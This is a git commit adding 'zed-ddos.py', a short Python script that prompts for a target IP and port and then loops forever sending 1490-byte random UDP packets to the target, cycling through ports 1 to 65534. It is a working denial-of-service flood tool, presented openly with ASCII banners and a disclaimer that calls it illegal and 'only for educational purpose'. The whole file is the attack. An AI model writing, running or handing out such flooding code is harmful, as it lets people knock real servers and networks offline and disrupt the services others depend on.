77e538926929b8a0b86d79e7367c5a79c26e42d8
theonlyziad <132782844+theonlyziad@users.noreply.github.com>
2024-04-07 14:58:37 +0100

    Create zed-ddos.py

---
+++ zed-ddos.py
@@ -0,0 +1,65 @@
+print ("\033[91m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+print ("""
+  ____________ _____    _____  _____   ____   _____  
+ |___  /  ____|  __ \  |  __ \|  __ \ / __ \ / ____| 
+    / /| |__  | |  | | | |  | | |  | | |  | | (___   
+   / / |  __| | |  | | | |  | | |  | | |  | |\___ \  
+  / /__| |____| |__| | | |__| | |__| | |__| |____) | 
+ /_____|______|_____/  |_____/|_____/ \____/|_____/  
+""")
+print
+print "Coded By : theonlyziad"
+print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
+print " enjoy "
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+os.system("clear")
+print("\033[93m")
+print("""
+  ____________ _____    _____  _____   ____   _____  
+ |___  /  ____|  __ \  |  __ \|  __ \ / __ \ / ____| 
+    / /| |__  | |  | | | |  | | |  | | |  | | (___   
+   / / |  __| | |  | | | |  | | |  | | |  | |\___ \  
+  / /__| |____| |__| | | |__| | |__| | |__| |____) | 
+ /_____|______|_____/  |_____/|_____/ \____/|_____/  
+""")
+print("\033[92m")
+print("[                    ] 0% ")
+time.sleep(5)
+print("[=====               ] 25%")
+time.sleep(5)
+print("[==========          ] 50%")
+time.sleep(5)
+print("[===============     ] 75%")
+time.sleep(5)
+print("[====================] 100%")
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print("Sent %s packet to %s through port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
